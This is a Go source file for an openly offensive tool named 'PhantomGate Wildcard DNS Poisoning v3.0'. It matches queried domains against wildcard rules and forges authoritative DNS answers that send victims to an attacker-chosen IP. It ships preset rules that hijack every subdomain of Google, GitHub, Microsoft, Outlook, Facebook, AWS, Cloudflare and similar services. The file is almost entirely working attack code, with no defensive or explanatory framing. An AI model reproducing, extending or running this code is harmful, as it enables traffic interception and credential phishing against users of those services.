package dns

import (
	"encoding/binary"
	"fmt"
	"log"
	"net"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// ══════════════════════════════════════════════════════════════════════════════
// PHANTOMGATE WILDCARD DNS POISONING v3.0 — POISON ALL SUBDOMAINS
// ══════════════════════════════════════════════════════════════════════════════

type WildcardPoisoner struct {
	iface       string
	redirectIP  net.IP
	running     bool
	stopChan    chan struct{}
	
	// Wildcard rules
	rules       []*WildcardRule
	rulesMu     sync.RWMutex
	
	// Statistics
	stats       *WildcardStats
	
	// Configuration
	config      *WildcardConfig
}

type WildcardRule struct {
	ID          string
	Pattern     string // e.g., "*.example.com", "*.*.example.com"
	RedirectIP  net.IP
	TTL         uint32
	Enabled     bool
	Priority    int
	Queries     int64
	LastQuery   time.Time
}

type WildcardStats struct {
	QueriesHandled int64
	RulesMatched   int64
	ResponsesSent  int64
	StartTime      time.Time
}

type WildcardConfig struct {
	Interface   string
	RedirectIP  string
	TTL         uint32
	DefaultTTL  uint32
}

func NewWildcardPoisoner(cfg WildcardConfig) (*WildcardPoisoner, error) {
	if cfg.TTL == 0 {
		cfg.TTL = 60
	}
	if cfg.DefaultTTL == 0 {
		cfg.DefaultTTL = 300
	}
	
	redirectIP := net.ParseIP(cfg.RedirectIP).To4()
	if redirectIP == nil {
		return nil, fmt.Errorf("invalid redirect IP: %s", cfg.RedirectIP)
	}
	
	return &WildcardPoisoner{
		iface:      cfg.Interface,
		redirectIP: redirectIP,
		stopChan:   make(chan struct{}),
		rules:      make([]*WildcardRule, 0),
		config:     &cfg,
		stats: &WildcardStats{
			StartTime: time.Now(),
		},
	}, nil
}

// ══════════════════════════════════════════════════════════════════════════════
// CORE FUNCTIONS
// ══════════════════════════════════════════════════════════════════════════════

func (w *WildcardPoisoner) Start() error {
	w.running = true
	
	log.Printf("[WILDCARD] Starting wildcard DNS poisoner")
	log.Printf("[WILDCARD] Redirect IP: %s", w.redirectIP)
	log.Printf("[WILDCARD] Rules loaded: %d", len(w.rules))
	
	return nil
}

func (w *WildcardPoisoner) Stop() {
	w.running = false
	close(w.stopChan)
	
	w.printStats()
	log.Printf("[WILDCARD] Wildcard DNS poisoner stopped")
}

// ══════════════════════════════════════════════════════════════════════════════
// RULE MANAGEMENT
// ══════════════════════════════════════════════════════════════════════════════

func (w *WildcardPoisoner) AddRule(pattern string, redirectIP net.IP, ttl uint32, priority int) string {
	w.rulesMu.Lock()
	defer w.rulesMu.Unlock()
	
	rule := &WildcardRule{
		ID:         generateRuleID(),
		Pattern:    pattern,
		RedirectIP: redirectIP,
		TTL:        ttl,
		Enabled:    true,
		Priority:   priority,
	}
	
	w.rules = append(w.rules, rule)
	
	// Sort by priority (highest first)
	sortRulesByPriority(w.rules)
	
	log.Printf("[WILDCARD] Added rule: %s → %s (Priority: %d)", pattern, redirectIP, priority)
	return rule.ID
}

func (w *WildcardPoisoner) RemoveRule(ruleID string) bool {
	w.rulesMu.Lock()
	defer w.rulesMu.Unlock()
	
	for i, rule := range w.rules {
		if rule.ID == ruleID {
			w.rules = append(w.rules[:i], w.rules[i+1:]...)
			log.Printf("[WILDCARD] Removed rule: %s", ruleID)
			return true
		}
	}
	return false
}

func (w *WildcardPoisoner) EnableRule(ruleID string) bool {
	w.rulesMu.Lock()
	defer w.rulesMu.Unlock()
	
	for _, rule := range w.rules {
		if rule.ID == ruleID {
			rule.Enabled = true
			return true
		}
	}
	return false
}

func (w *WildcardPoisoner) DisableRule(ruleID string) bool {
	w.rulesMu.Lock()
	defer w.rulesMu.Unlock()
	
	for _, rule := range w.rules {
		if rule.ID == ruleID {
			rule.Enabled = false
			return true
		}
	}
	return false
}

// ══════════════════════════════════════════════════════════════════════════════
// WILDCARD MATCHING
// ══════════════════════════════════════════════════════════════════════════════

func (w *WildcardPoisoner) MatchDomain(domain string) *WildcardRule {
	w.rulesMu.RLock()
	defer w.rulesMu.RUnlock()
	
	domain = strings.ToLower(domain)
	
	for _, rule := range w.rules {
		if !rule.Enabled {
			continue
		}
		
		if w.matchPattern(domain, rule.Pattern) {
			atomic.AddInt64(&rule.Queries, 1)
			rule.LastQuery = time.Now()
			atomic.AddInt64(&w.stats.RulesMatched, 1)
			return rule
		}
	}
	
	return nil
}

func (w *WildcardPoisoner) matchPattern(domain, pattern string) bool {
	// Exact match
	if domain == pattern {
		return true
	}
	
	// Wildcard match
	patternParts := strings.Split(pattern, ".")
	domainParts := strings.Split(domain, ".")
	
	// Check if pattern starts with *.
	if strings.HasPrefix(pattern, "*.") {
		// Match any subdomain
		suffix := strings.TrimPrefix(pattern, "*.")
		return strings.HasSuffix(domain, "."+suffix) || domain == suffix
	}
	
	// Check multi-level wildcard *.*.domain.com
	if len(patternParts) >= 3 && patternParts[0] == "*" && patternParts[1] == "*" {
		suffix := strings.Join(patternParts[2:], ".")
		return strings.HasSuffix(domain, "."+suffix) || domain == suffix
	}
	
	// Partial wildcard match
	if len(patternParts) != len(domainParts) {
		return false
	}
	
	for i := len(patternParts) - 1; i >= 0; i-- {
		if patternParts[i] == "*" {
			continue
		}
		if patternParts[i] != domainParts[i] {
			return false
		}
	}
	
	return true
}

// ══════════════════════════════════════════════════════════════════════════════
// DNS RESPONSE FORGERY
// ══════════════════════════════════════════════════════════════════════════════

func (w *WildcardPoisoner) HandleQuery(domain string) (net.IP, uint32) {
	rule := w.MatchDomain(domain)
	if rule == nil {
		return nil, 0
	}
	
	atomic.AddInt64(&w.stats.QueriesHandled, 1)
	
	log.Printf("[WILDCARD] %s matched rule %s → %s", domain, rule.Pattern, rule.RedirectIP)
	
	return rule.RedirectIP, rule.TTL
}

func (w *WildcardPoisoner) ForgeResponse(query []byte, responseIP net.IP, ttl uint32) []byte {
	if len(query) < 12 {
		return nil
	}
	
	txnID := binary.BigEndian.Uint16(query[0:2])
	qdCount := binary.BigEndian.Uint16(query[4:6])
	
	if qdCount == 0 {
		return nil
	}
	
	// Parse query name
	queryName, queryEnd := parseDNSNameSimple(query, 12)
	if queryName == "" || queryEnd+4 > len(query) {
		return nil
	}
	
	// Copy question section
	questionSection := query[12:queryEnd+4]
	
	// Build response
	resp := make([]byte, 0, 12+len(questionSection)+16)
	
	// DNS Header
	header := make([]byte, 12)
	binary.BigEndian.PutUint16(header[0:2], txnID)
	binary.BigEndian.PutUint16(header[2:4], 0x8180) // Response, Authoritative
	binary.BigEndian.PutUint16(header[4:6], 1)       // Questions
	binary.BigEndian.PutUint16(header[6:8], 1)       // Answers
	resp = append(resp, header...)
	
	// Question section
	resp = append(resp, questionSection...)
	
	// Answer section
	answer := make([]byte, 16)
	binary.BigEndian.PutUint16(answer[0:2], 0xC00C) // Name pointer
	binary.BigEndian.PutUint16(answer[2:4], 1)       // Type A
	binary.BigEndian.PutUint16(answer[4:6], 1)       // Class IN
	binary.BigEndian.PutUint32(answer[6:10], ttl)
	binary.BigEndian.PutUint16(answer[10:12], 4)     // Data length
	copy(answer[12:16], responseIP.To4())
	resp = append(resp, answer...)
	
	atomic.AddInt64(&w.stats.ResponsesSent, 1)
	
	return resp
}

// ══════════════════════════════════════════════════════════════════════════════
// PREDEFINED RULES
// ══════════════════════════════════════════════════════════════════════════════

func (w *WildcardPoisoner) AddCommonRules(redirectIP net.IP) {
	rules := []struct {
		pattern  string
		priority int
	}{
		{"*.google.com", 100},
		{"*.github.com", 100},
		{"*.microsoft.com", 100},
		{"*.office.com", 100},
		{"*.outlook.com", 100},
		{"*.live.com", 100},
		{"*.facebook.com", 100},
		{"*.twitter.com", 100},
		{"*.linkedin.com", 100},
		{"*.instagram.com", 100},
		{"*.amazonaws.com", 100},
		{"*.cloudflare.com", 100},
	}
	
	for _, r := range rules {
		w.AddRule(r.pattern, redirectIP, w.config.TTL, r.priority)
	}
}

// ══════════════════════════════════════════════════════════════════════════════
// UTILITY
// ══════════════════════════════════════════════════════════════════════════════

func (w *WildcardPoisoner) GetRules() []*WildcardRule {
	w.rulesMu.RLock()
	defer w.rulesMu.RUnlock()
	
	rules := make([]*WildcardRule, len(w.rules))
	copy(rules, w.rules)
	return rules
}

func (w *WildcardPoisoner) printStats() {
	log.Printf("[WILDCARD STATS] Queries: %d | Rules matched: %d | Responses: %d",
		atomic.LoadInt64(&w.stats.QueriesHandled),
		atomic.LoadInt64(&w.stats.RulesMatched),
		atomic.LoadInt64(&w.stats.ResponsesSent))
}

func generateRuleID() string {
	return fmt.Sprintf("rule_%d", time.Now().UnixNano())
}

func sortRulesByPriority(rules []*WildcardRule) {
	for i := 1; i < len(rules); i++ {
		for j := i; j > 0 && rules[j].Priority > rules[j-1].Priority; j-- {
			rules[j], rules[j-1] = rules[j-1], rules[j]
		}
	}
}
